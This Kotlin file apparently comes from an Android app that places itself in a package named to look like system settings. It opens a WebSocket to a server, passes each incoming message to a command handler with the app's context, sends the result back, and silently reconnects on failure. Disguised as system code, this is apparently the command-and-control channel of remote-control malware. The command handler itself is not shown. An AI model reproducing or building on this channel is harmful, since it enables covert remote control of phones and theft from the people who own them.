package com.android.system.settings

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener

class Websocket {
    fun connectToWebSocket(serverUrl: String,context: Context){
        val client = OkHttpClient()
        val request = Request.Builder().url(serverUrl).build()

        val listener = object : WebSocketListener() {
            lateinit var webSocket: WebSocket

            override fun onOpen(webSocket: WebSocket, response: Response) {
                this.webSocket = webSocket
                Log.d("WebSocketDemo", "Connection opened.")

            }

            @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("check1",text.split("|")[0])
                val data = text.split("|")[1]
                val to = text.split("|")[0]
                val finalResponse = ManageCommand().manageMessage(context, data,to)
                sendMessage(finalResponse)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("WebSocketDemo", "Error connecting: ${t.message}")
                connectToWebSocket(serverUrl,context)
            }
            // Function to send a message
            private fun sendMessage(message: String) {
                webSocket.send(message)
            }
        }
        client.newWebSocket(request,listener)
    }
}
